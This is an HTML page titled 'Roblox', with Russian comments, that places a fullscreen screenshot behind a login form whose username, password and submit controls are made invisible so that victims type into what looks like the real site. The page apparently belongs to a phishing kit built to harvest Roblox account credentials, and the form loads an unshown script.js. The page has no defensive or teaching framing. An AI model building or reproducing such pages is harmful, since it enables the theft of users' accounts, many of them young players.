<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Твой скриншот на весь экран -->
    <img src="bg.jpg" class="fullscreen-bg" alt="bg">

    <!-- Форма, которая будет висеть поверх картинки -->
    <form id="loginForm" class="overlay-form">
        <!-- Поля прозрачные, но кликабельные -->
        <input type="text" id="username" class="invisible-input" placeholder="" required autocomplete="off">
        <input type="password" id="password" class="invisible-input" placeholder="" required autocomplete="off">
        <button type="submit" class="invisible-btn"></button>
    </form>

    <script src="script.js"></script>
</body>
</html>
